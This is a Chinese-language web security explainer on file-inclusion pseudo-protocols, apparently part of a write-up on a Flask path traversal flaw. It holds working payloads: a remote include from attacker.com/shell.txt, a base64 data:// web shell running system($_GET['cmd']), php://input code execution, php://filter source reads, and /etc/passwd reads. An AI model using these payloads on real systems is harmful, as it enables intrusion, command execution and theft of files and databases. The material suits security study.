🌐 伪协议（Pseudo Protocol）知识

伪协议是在文件包含函数中使用的特殊协议标识，用于执行特定操作。虽然在 Python/Flask 环境中不如 PHP 常见，但理解其原理对 Web 安全分析至关重要。

1️⃣ HTTP 伪协议

允许文件包含函数从远程服务器获取内容，用于远程文件包含(RFI)和内网扫描。

// PHP 示例 - 远程文件包含
include('http://attacker.com/shell.txt');

// PHP 示例 - 内网探测
include('http://192.168.1.1/admin.php');

// Python 示例
import requests
r = requests.get('http://target/fi?file=http://attacker/shell.txt')

2️⃣ data 伪协议

允许直接在 URL 中嵌入数据内容，实现代码执行。

// PHP 示例 - base64编码代码执行
include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==');

// 解码后为: <?php system($_GET['cmd']); ?>

// Python - 读取元数据
import base64
data = "data:text/plain,hello"

3️⃣ php:// 伪协议

允许访问各种 I/O 流，常用于读取源码和执行代码。

// PHP 示例 - base64编码读取源码（绕过过滤器）
index.php?page=php://filter/read=convert.base64-encode/resource=config.php

// PHP 示例 - 通过POST发送代码执行
POST /index.php?page=php://input
Body: <?php system('id'); ?>

4️⃣ file:// 伪协议

直接读取本地文件。

// file协议读取本地文件
file:///etc/passwd
file:///C:/Windows/win.ini

5️⃣ 实际影响

在本次 Flask 应用中，/page?name= 路由存在路径穿越漏洞，攻击者可以：

  • 读取任意源文件（../app.py）
  • 下载数据库文件（../data/users.db）
  • 与上传的 WebShell 联动执行命令
